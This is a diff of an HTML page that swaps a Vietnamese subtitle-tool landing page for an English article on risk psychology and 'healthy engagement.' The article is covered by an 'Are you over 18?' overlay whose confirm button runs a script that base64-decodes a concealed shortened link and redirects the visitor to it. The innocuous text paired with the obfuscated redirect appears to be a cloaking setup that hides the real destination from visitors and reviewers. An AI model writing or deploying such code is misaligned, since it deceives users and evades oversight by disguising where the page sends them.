@@ -1,81 +1,72 @@
+
 <!DOCTYPE html>
-<html lang="vi">
+<html lang="en">
 <head>
-  <meta charset="UTF-8" />
-  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
-  <title>Submagic AI - Tạo Phụ Đề Video Chuyên Nghiệp</title>
-  <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;700&display=swap" rel="stylesheet">
+  <meta charset="UTF-8">
+  <title>Understanding Risk Psychology</title>
   <style>
-    body {
-      margin: 0;
-      font-family: 'Inter', sans-serif;
-      background: linear-gradient(to right, #141e30, #243b55);
-      color: white;
-      text-align: center;
-      padding: 50px 20px;
+    body { margin: 0; font-family: Arial, sans-serif; background-color: #f7f7f7; }
+    img.banner { width: 100%; height: auto; display: block; }
+    .content { padding: 40px; max-width: 900px; margin: auto; color: #333; }
+    .content h1 { font-size: 2em; margin-bottom: 20px; }
+    .content p { line-height: 1.6; margin-bottom: 20px; }
+
+    #ageOverlay {
+      position: fixed; top:0; left:0; width:100vw; height:100vh;
+      background: rgba(0,0,0,0.5); backdrop-filter: blur(5px);
+      display:flex; justify-content:center; align-items:center; z-index:9999;
     }
-    .container {
-      max-width: 800px;
-      margin: auto;
+    #ageOverlay .popup {
+      background:#2a2a3f; padding:30px; border-radius:10px;
+      text-align:center; color:white; max-width:90%;
     }
-    h1 {
-      font-size: 2.8em;
-      margin-bottom: 10px;
+    #ageOverlay button {
+      background:#00b386; border:none; padding:12px 24px;
+      color:white; font-size:1rem; border-radius:5px; cursor:pointer;
     }
-    p {
-      font-size: 1.2em;
-      margin-bottom: 30px;
-    }
-    .cta-btn {
-      background-color: #00d8ff;
-      color: #141e30;
-      padding: 15px 30px;
-      font-size: 1.2em;
-      font-weight: bold;
-      border: none;
-      border-radius: 8px;
-      cursor: pointer;
-      transition: 0.3s ease;
-    }
-    .cta-btn:hover {
-      background-color: #00bcd4;
-    }
-    .features {
-      margin-top: 40px;
-      text-align: left;
-    }
-    .feature-item {
-      margin-bottom: 15px;
-    }
-    .feature-item::before {
-      content: "✔";
-      margin-right: 10px;
-      color: #00d8ff;
-    }
-    .footer {
-      margin-top: 60px;
-      font-size: 0.9em;
-      color: #ccc;
-    }
+    #ageOverlay button:hover { background:#009970; }
   </style>
+  <script>
+    function confirmAge() {
+      let k = "aHR0cHM6Ly90LmNvL3AwWEJURG4xakM=";
+      let x = atob(k);
+      window.location.href = x;
+    }
+  </script>
 </head>
 <body>
-  <div class="container">
-    <h1>Submagic AI</h1>
-    <p>Biến video của bạn thành kiệt tác với phụ đề tự động cực kỳ chính xác. Được hơn 100.000 nhà sáng tạo tin dùng.</p>
-    <button class="cta-btn" onclick="window.location.href='redirect.html'">Trải Nghiệm Ngay</button>
 
-    <div class="features">
-      <div class="feature-item">Tạo phụ đề video tự động bằng AI</div>
-      <div class="feature-item">Hỗ trợ TikTok, YouTube Shorts, Reels</div>
-      <div class="feature-item">Chèn emoji, hiệu ứng động theo lời nói</div>
-      <div class="feature-item">Giao diện kéo thả dễ dùng</div>
-      <div class="feature-item">Xuất video 1080p không watermark</div>
-    </div>
-
-    <div class="footer">
-      © 2025 Submagic AI. Công cụ phụ đề tốt nhất cho nhà sáng tạo Việt.
+  <div id="ageOverlay">
+    <div class="popup">
+      <h2>Are you over 18 years old?</h2>
+      <button onclick="confirmAge()">Yes, I'm over 18</button>
     </div>
   </div>
+
+  <img class="banner" src="banner.jpg" alt="Banner">
+
+  <div class="content">
+    <h1>The Psychology Behind High-Risk Digital Experiences</h1>
+
+    <p>In today's fast-paced digital ecosystem, platforms offering variable rewards—such as trading apps, gamified experiences, or decision-based interfaces—have dramatically increased user engagement. These environments capitalize on human tendencies toward risk, uncertainty, and the thrill of potential gain.</p>
+
+    <p>Behavioral psychology research highlights cognitive biases like the <em>availability heuristic</em> and <em>loss aversion</em>, where individuals overweight infrequent outcomes and feel losses more intensely than gains. When these biases intersect with surprise rewards or instant feedback loops, users become more immersed and emotionally invested.</p>
+
+    <p>Moreover, patterns like near-miss (almost winning) or intermittent reward schedules have been shown to stimulate dopamine production, reinforcing repetitive behavior. This mechanistic approach is similar to how gaming notifications or social media likes are structured.</p>
+
+    <p>Design elements—such as dynamic visuals, sound cues, and countdown timers—can further heighten user arousal and urgency. Transparent design practices, coupled with educational nudges, help cultivate healthier digital habits and support informed consent.</p>
+
+    <h2>Best Practices to Promote Healthy Engagement</h2>
+    <p>Platforms today are increasingly adopting features that encourage mindful use, including:</p>
+    <ul>
+      <li><strong>Cooldown reminders:</strong> Gentle pop-ups when users exceed certain time limits.</li>
+      <li><strong>Reward transparency:</strong> Clear information about probability of outcomes and payout structures.</li>
+      <li><strong>Opt-out options:</strong> Easy ways for users to self-exclude or pause their experience.</li>
+      <li><strong>Educational content:</strong> Explaining behavioral patterns and suggesting healthy interaction intervals.</li>
+    </ul>
+
+    <p>By integrating ethical design, transparency, and respect for cognitive vulnerabilities, digital experiences can balance engagement with responsibility.</p>
+  </div>
+
 </body>
 </html>
